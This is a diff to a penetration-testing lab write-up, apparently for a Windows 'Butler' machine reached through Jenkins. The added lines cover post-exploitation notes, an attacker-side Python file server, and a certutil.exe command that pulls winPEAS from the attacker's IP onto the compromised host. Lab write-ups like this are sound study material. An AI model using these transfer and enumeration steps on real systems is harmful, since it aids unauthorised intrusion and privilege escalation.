@@ -398,9 +398,24 @@ Reverse shell established. We are not NT authority system yet!
 
 Now that we have established a reverse shell back to our Linux machine, there is a multitude of methodes to attempt privilige escalation tactics. We have already conducted a cursory enumeration of the target via systeminfo.
 
+## Other notable findings include the download of WiseCare365_5.6.7.568.exe inside the downloads folder.
+![image](https://github.com/user-attachments/assets/a0ba783b-7944-49e3-a307-7432a652c853)
+
+The same program was also present user Butler.
+
+nukedefender.ps1 is likely just a powershell script created to allow the current lab to function properly without built in security interference.
+
 ## To help us in the second stages of post exploitation - enumeraiton phase, we can use a tool called winPEAS. 
     Once downloaded on Kali, and hosted in 'fire' (our dedicated transfer folder) 
-    Execute file hosting on attacker machine via python3 -m http.<server> 8000
+    Execute file hosting on attacker machine via python -m SimpleHTTPServer
+    Download winPEASx64 (renamed to winpease.exe) onto Jenkins shell: certutil.exe -urlcache -f http://192.168.64.129:8000/winpeas.exe winpeas.exe 
+
+![image](https://github.com/user-attachments/assets/e51bcd8e-a8cc-4b8e-8648-eaf5741d0ba9)
+
+![image](https://github.com/user-attachments/assets/4c72c1e9-93f0-4f20-9725-c115f3074041)
+
+## Run winpease.exe on butler and analyse results.
+
 
 
 ### RED TEAM - Jenkins exploitation study: https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/
